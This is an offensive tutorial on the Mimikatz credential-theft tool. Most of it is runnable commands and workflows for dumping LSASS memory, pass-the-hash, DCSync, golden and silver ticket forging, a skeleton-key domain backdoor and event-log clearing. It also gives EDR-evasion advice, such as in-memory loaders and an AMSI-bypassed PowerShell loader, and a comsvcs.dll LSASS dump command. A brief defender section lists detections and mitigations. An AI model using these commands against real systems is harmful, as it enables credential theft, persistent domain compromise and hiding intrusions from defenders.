# Mimikatz — full tutorial

Mimikatz is the Windows credential-extraction tool. Originally a research demo by Benjamin Delpy, it now ships every Kerberos / LSASS / DPAPI / CryptoAPI attack technique. EDRs flag it on sight; serious operators use forks, in-memory loaders, or the same APIs from C#/Rust.

## Install

```terminal
# Latest binaries:
https://github.com/gentilkiwi/mimikatz/releases
```

`mimikatz.exe` (32/64-bit). Run from elevated cmd / PowerShell.

## The "modules" mental model

Mimikatz uses a `module::command [args]` syntax. The big modules:

| Module | What it does |
|--------|--------------|
| `privilege` | Elevate self (`debug`, `driver`) |
| `token` | Token impersonation, list / steal |
| `sekurlsa` | Memory of LSASS — passwords, NT hashes, Kerberos tickets |
| `lsadump` | LSA secrets, SAM, cached creds, DCSync |
| `kerberos` | Pass-the-ticket, golden / silver |
| `crypto` | Local cert / CryptoAPI store dumping |
| `dpapi` | DPAPI master keys / blobs |
| `vault` | Windows Credential Vault |
| `process` | List / kill / inject processes |
| `service` | Manipulate services |
| `event` | Clear event logs |
| `misc` | One-offs (skeleton key, memssp, addsid, mflt) |

## Prerequisite

Always start with:

```terminal
privilege::debug
```

If this fails (`ERROR kuhl_m_privilege_simple`), you're not local admin / SYSTEM. `token::elevate` may help if you have SeImpersonate.

## Most-used commands

### sekurlsa::logonpasswords

The headline. Dumps everything LSASS holds — for every interactive session.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

Returns: NT hash, sometimes plaintext (older OS without Credential Guard), Kerberos tickets, MSV credentials.

### sekurlsa::tickets

```
sekurlsa::tickets /export
```

Dumps every Kerberos ticket in memory to `*.kirbi` files in current dir. Pass-the-ticket fodder.

### sekurlsa::pth — pass-the-hash

```
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:5e5a04...
```

Spawns a new `cmd.exe` whose Kerberos / NTLM materials match the supplied hash. Acts as that user from then on.

### lsadump::sam — local SAM

```
lsadump::sam
```

Local Administrator NT hash, etc. Equivalent to running `secretsdump -sam`.

### lsadump::lsa /patch — cached domain creds

```
lsadump::lsa /patch
```

Cached NT hashes for every account that's logged in.

### lsadump::dcsync — replication-based dump

```
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /all /csv
```

Requires `Replicate Directory Changes` rights (DA equivalent). Pulls hashes via DRSUAPI like a DC would.

### kerberos::golden / silver

```
# Golden — krbtgt hash compromises domain forever
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
                 /krbtgt:<NT-hash> /ptt

# Silver — single service ticket from a service-account hash
kerberos::golden /user:alice /domain:corp.local /sid:S-1-5-21-... \
                 /target:fileserver /service:cifs /rc4:<svc-NT> /ptt
```

`/ptt` injects the resulting ticket into the current logon session.

### misc::skeletonkey — domain backdoor

```
misc::skeletonkey /domain:corp.local
```

Patches LSASS on a DC so any domain user can authenticate with the master password "mimikatz" (also keeping their real password). Survives until DC reboot. **Extremely loud** — only for explicit lab/research.

### crypto::capi / dpapi modules

For decrypting browser cookies, RDP cached credentials, Wi-Fi profiles, etc. Pair with `mimikatz dpapi::masterkey /system:SYSTEM /security:SECURITY /sid:<sid>`.

### event::clear — log clearing

```
event::clear /eventlog:Security
```

Detection-friendly — clearing logs trips its own EID 1102. Considered loud.

## Workflows

### Local admin → all creds in memory

```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
```

### Local admin → SAM + cached domain hashes

```
privilege::debug
lsadump::sam
lsadump::lsa /patch
```

### From any domain user → DCSync krbtgt → golden ticket

(needs DA-equivalent for DCSync; or specific delegations)

```
lsadump::dcsync /domain:corp.local /user:krbtgt
kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-...
                 /krbtgt:<krbtgt-NT> /ticket:fakeadmin.kirbi
kerberos::ptt fakeadmin.kirbi
```

### As SYSTEM on a DC — direct LSASS

```
privilege::debug
token::elevate
lsadump::lsa /patch /name:krbtgt
```

## Good output

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1234567 (00000000:00012d687)
Session           : Interactive from 1
User Name         : alice
Domain            : CORP
Logon Server      : DC01
Logon Time        : 4/29/2026 9:01:23 AM
SID               : S-1-5-21-...

        msv :
         [00000003] Primary
         * Username : alice
         * Domain   : CORP
         * NTLM     : 5e5a04...
         * SHA1     : 3b4c5d...
        tspkg :
        wdigest :
         * Username : alice
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : alice
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
```

`Password : (null)` is normal on modern Windows — wdigest disabled by default since 2014. NT hash is the prize.

## Bad output and fixes

| Symptom | Cause | Fix |
|---------|-------|-----|
| `ERROR privilege::debug : 0x00000522` | Not admin | Run elevated |
| `ERROR sekurlsa::logonpasswords` | Credential Guard / VBS active | Cannot dump from LSASS — pivot to other techniques (memory dump offline, mimikatz on different host) |
| `ERROR lsadump::dcsync : 0x00002105` | No replication rights | Need DA-equivalent or specific ACL grant |
| File blocked on disk | EDR signature match | Use in-memory loader (Invoke-Mimikatz from PowerShell, BOF, etc.); never write `mimikatz.exe` to disk |
| Kerberos ticket injection fails | Time skew >5 min | `w32tm /resync` or sync clocks |

## Defender's perspective

Mimikatz is one of the **most signatured** tools on earth:

- AV string-match on the binary, on commands like `privilege::debug`, on output banners.
- Sysmon EID 10 (process access) of `lsass.exe` from non-Microsoft process — **this is the most reliable detection**.
- 4662 / 4624 / 4663 patterns specific to dcsync.
- ETW / AMSI catches PowerShell variants on modern Windows.

Detection ideas:
- Block any process other than vendor-allowlisted from opening LSASS with `PROCESS_VM_READ` or `PROCESS_QUERY_LIMITED_INFORMATION`.
- Microsoft Defender Attack Surface Reduction rule: **Block credential stealing from lsass.exe**.
- LSA Protected Process Light (RunAsPPL) — blocks unsigned tools from reading LSASS.
- Credential Guard — moves secrets to VBS-isolated process, mimikatz cannot reach.

## OPSEC

- The binary is detected by every modern AV. **Never** drop `mimikatz.exe` to disk in a real engagement.
- Use one of: `Invoke-Mimikatz` (PowerShell, AMSI-bypassed), Cobalt Strike `mimikatz` BOF, SafetyKatz, pypykatz (cross-platform with offline lsass dump).
- Offline approach: dump lsass with `comsvcs.dll MiniDump`, copy `.dmp` off-host, run pypykatz/mimikatz against it locally — leaves no Mimikatz binary on target.

```terminal
# Offline LSASS dump
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <lsass-pid> C:\temp\lsass.dmp full
# Then on operator host:
pypykatz lsa minidump lsass.dmp
```

## Related tools

| Tool | Niche |
|------|-------|
| **pypykatz** | Pure Python, parses offline dumps, cross-platform |
| **SafetyKatz** | C# variant, EDR-friendlier |
| **lsassy** | Remote LSASS dump + parse from Linux |
| **Rubeus** | Pure-Kerberos toolkit (C#) |
| **gentilkiwi/kekeo** | Mimikatz sister project for Kerberos delegations |
| **Invoke-Mimikatz** | PS1 reflective loader |
| **donut + Mimikatz** | Shellcode wrapper for in-memory exec |
